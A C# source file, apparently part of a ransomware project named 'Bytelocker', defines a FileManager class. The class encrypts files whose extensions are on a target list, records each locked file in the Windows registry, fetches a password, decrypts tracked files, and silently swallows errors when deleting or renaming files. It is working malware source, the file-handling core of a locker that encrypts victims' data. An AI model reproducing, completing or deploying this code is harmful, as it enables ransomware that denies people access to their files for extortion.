using System;
using System.IO;
using Bytelocker.Settings;

namespace Bytelocker.CryptoManager
{
    internal class FileManager
    {
        private readonly FileEncrypter fe;
        private string file_path;
        private readonly RegistryManager rm;

        public FileManager()
        {
            fe = new FileEncrypter();
            rm = new RegistryManager();
        }

        public void ChooseFile(string file_path)
        {
            this.file_path = file_path;
        }

        public void DeleteFile()
        {
            try
            {
                File.Delete(file_path);
            }
            catch (Exception)
            {
            }
        }

        public void RenameTmpFileToOrig()
        {
            try
            {
                File.Move(file_path + FileEncrypter.FILE_EXTENSION_ENCRYPT_TMP, file_path);
            }
            catch (Exception)
            {
            }
        }

        public void SetupFileEncrypter()
        {
            fe.FetchPassword();
            fe.GenerateRandomSalt();
        }

        public void removeRegistryItem()
        {
            try
            {
                rm.DeleteValue(RegistryManager.FILES_KEY_NAME, file_path);
            }
            catch (ArgumentException)
            {
                // if the value does not exist in registry
            }
        }

        public bool DecryptFile()
        {
            var success = false;

            if (File.Exists(file_path))
                if (!IsFileLocked(file_path) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, file_path) != "none")
                {
                    success = true;
                    fe.ChooseFile(file_path);
                    fe.Decrypt();
                    removeRegistryItem();
                }

            return success;
        }

        public bool EncryptFile()
        {
            var success = true;

            var file_extension = Path.GetExtension(file_path);

            if (!IsFileLocked(file_path) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, file_path) == "none"
                                         && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(file_extension.ToLower()))
            {
                fe.ChooseFile(file_path);
                fe.Encrypt();
                rm.CreateBoolValue(RegistryManager.FILES_KEY_NAME, file_path, true);
            }
            else
            {
                success = false;
            }

            return success;
        }

        public static bool IsFileLocked(string path)
        {
            FileStream stream = null;
            var file = new FileInfo(path);

            try
            {
                stream = file.Open(FileMode.Open, FileAccess.Write, FileShare.None);
            }
            catch (Exception)
            {
                return true;
            }
            finally
            {
                if (stream != null)
                    stream.Close();
            }

            return false;
        }
    }
}